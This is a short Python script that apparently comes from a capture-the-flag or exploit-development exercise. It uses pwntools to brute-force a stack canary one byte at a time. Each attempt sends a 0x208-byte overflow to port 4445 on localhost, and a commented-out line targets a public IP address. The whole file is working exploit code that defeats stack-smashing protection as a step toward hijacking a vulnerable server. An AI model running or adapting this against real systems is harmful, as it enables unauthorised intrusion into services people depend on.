from pwn import *
import time


context.log_level = "ERROR"
canary = b'\x00'
while (len(canary) < 8):
    for ch in map(lambda i: i.to_bytes(1, 'little'), range(256)):
        io = remote('localhost', 4445)
        # io = remote('114.177.250.4', 4445)

        payload = b'A' * 0x208
        payload += canary
        payload += ch

        io.send(payload)
        time.sleep(0.1)
        res = io.recv()
        print(res)
        if b'localhost' in res:
            canary += ch
            break

        io.close()
    print(hex(u64(canary.ljust(8, b'\x00'))))
